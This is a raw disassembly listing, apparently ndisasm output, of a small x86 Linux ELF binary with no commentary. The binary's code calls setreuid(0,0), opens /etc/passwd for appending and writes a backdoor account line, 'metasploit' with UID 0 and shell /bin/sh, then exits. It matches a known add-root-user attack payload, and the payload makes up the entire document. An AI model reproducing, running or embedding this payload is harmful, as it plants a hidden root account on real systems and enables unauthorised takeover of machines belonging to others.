00000000  7F45              jg 0x47
00000002  4C                dec esp
00000003  46                inc esi
00000004  0101              add [ecx],eax
00000006  0100              add [eax],eax
00000008  0000              add [eax],al
0000000A  0000              add [eax],al
0000000C  0000              add [eax],al
0000000E  0000              add [eax],al
00000010  0200              add al,[eax]
00000012  0300              add eax,[eax]
00000014  0100              add [eax],eax
00000016  0000              add [eax],al
00000018  54                push esp
00000019  80040834          add byte [eax+ecx],0x34
0000001D  0000              add [eax],al
0000001F  0000              add [eax],al
00000021  0000              add [eax],al
00000023  0000              add [eax],al
00000025  0000              add [eax],al
00000027  003400            add [eax+eax],dh
0000002A  2000              and [eax],al
0000002C  0100              add [eax],eax
0000002E  0000              add [eax],al
00000030  0000              add [eax],al
00000032  0000              add [eax],al
00000034  0100              add [eax],eax
00000036  0000              add [eax],al
00000038  0000              add [eax],al
0000003A  0000              add [eax],al
0000003C  008004080080      add [eax-0x7ffff7fc],al
00000042  0408              add al,0x8
00000044  B500              mov ch,0x0
00000046  0000              add [eax],al
00000048  16                push ss
00000049  0100              add [eax],eax
0000004B  0007              add [edi],al
0000004D  0000              add [eax],al
0000004F  0000              add [eax],al
00000051  1000              adc [eax],al
00000053  0031              add [ecx],dh
00000055  C9                leave
00000056  89CB              mov ebx,ecx
00000058  6A46              push byte +0x46
0000005A  58                pop eax
0000005B  CD80              int 0x80
0000005D  6A05              push byte +0x5
0000005F  58                pop eax
00000060  31C9              xor ecx,ecx
00000062  51                push ecx
00000063  6873737764        push dword 0x64777373
00000068  682F2F7061        push dword 0x61702f2f
0000006D  682F657463        push dword 0x6374652f
00000072  89E3              mov ebx,esp
00000074  41                inc ecx
00000075  B504              mov ch,0x4
00000077  CD80              int 0x80
00000079  93                xchg eax,ebx
0000007A  E828000000        call dword 0xa7
0000007F  6D                insd
00000080  657461            gs jz 0xe4
00000083  7370              jnc 0xf5
00000085  6C                insb
00000086  6F                outsd
00000087  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
0000008F  736A              jnc 0xfb
00000091  3470              xor al,0x70
00000093  3449              xor al,0x49
00000095  52                push edx
00000096  633A              arpl [edx],di
00000098  303A              xor [edx],bh
0000009A  303A              xor [edx],bh
0000009C  3A2F              cmp ch,[edi]
0000009E  3A2F              cmp ch,[edi]
000000A0  62696E            bound ebp,[ecx+0x6e]
000000A3  2F                das
000000A4  7368              jnc 0x10e
000000A6  0A598B            or bl,[ecx-0x75]
000000A9  51                push ecx
000000AA  FC                cld
000000AB  6A04              push byte +0x4
000000AD  58                pop eax
000000AE  CD80              int 0x80
000000B0  6A01              push byte +0x1
000000B2  58                pop eax
000000B3  CD80              int 0x80
